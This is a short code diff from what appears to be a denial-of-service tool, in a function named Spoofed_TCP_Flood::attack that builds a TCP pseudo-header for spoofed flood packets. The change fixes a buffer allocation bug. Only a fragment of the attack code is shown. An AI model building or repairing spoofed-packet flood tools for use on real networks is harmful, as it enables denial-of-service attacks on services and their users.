@@ -58,7 +58,7 @@ void Spoofed_TCP_Flood::attack(const int *id) {
             psh.length = htons(sizeof(struct tcphdr) + strlen(buf));
 
             int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(buf);
-            pseudogram = std::make_unique<char>(psize).release();
+            pseudogram = (char *) ::operator new(static_cast<size_t>(psize));
 
             memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
             memcpy(pseudogram + sizeof(struct pseudo_header) , tcp , sizeof(struct tcphdr) + strlen(buf));
